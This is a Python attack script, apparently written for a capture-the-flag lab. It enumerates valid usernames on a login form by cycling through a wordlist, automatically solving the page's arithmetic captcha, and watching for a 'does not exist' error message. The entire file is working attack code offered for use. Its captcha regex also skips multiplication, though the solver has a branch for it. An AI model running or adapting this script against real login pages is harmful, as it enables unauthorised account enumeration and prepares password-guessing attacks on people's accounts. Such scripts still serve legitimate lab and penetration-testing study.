# Import the necessary modules
import requests
from bs4 import BeautifulSoup
import re
import time
import sys

# Set the URL of the web form to be attacked
url = "http://[machine_IP]/login"

# Set a flag for verbose output
verbose = True

# Set the initial value for the captcha
captcha = 12

# Set a flag to control the outer loop
do = True

# Open the file containing the list of usernames to try (in this case username.txt)
with open("usernames.txt", "r") as f:
    for line in f:
        do = True
        while do:
            usr = line.strip()
            # Create a payload containing the username, a dummy password, and the current captcha value
            payload = {"username":usr, "password":"none", "captcha": captcha}
            response = requests.post(url, data=payload)
            
            soup = BeautifulSoup(response.content, "html.parser")
            
            # Extract the captcha math problem from the response HTML
            element = soup.find(text=lambda text: '?' in text)
            if element is not None:
                question = element.strip()
                # Use regular expressions to extract the numbers and operation from the math problem
                match = re.match(r"(\d+)\s*([+\-/])\s(\d+)\s*\=\s*\?", question)
                if match is not None:
                    num1 = int(match.group(1))
                    op = match.group(2)
                    num2 = int(match.group(3))
                    if op == "+":
                        result = num1 + num2
                    elif op == "-":
                        result = num1 - num2
                    elif op == "*":
                        result = num1 * num2
                    elif op == "/":
                        result = num1 / num2
                    else:
                        result = None
                    
                    # Update the captcha value with the result of the math problem
                    if result is not None:
                        captcha  = str(result)

            # Check the response for the presence of an error message indicating an incorrect captcha
            if 'Invalid captcha' not in response.text:
                # If the captcha is correct, exit the inner loop
                do = False
            else:
                # If the captcha is incorrect, print a message (if verbose mode is enabled) and retry
                if verbose:
                    print("Wrong captcha retry")

        # Check the response for the presence of an error message indicating a non-existent username
        if 'does not exist' not in response.text:
            print(f"Username: {usr}.")
            input("Username find, press a key to stop")
            sys.exit()
        else:
            if verbose:
                print(f"Wrong username: {usr}.")
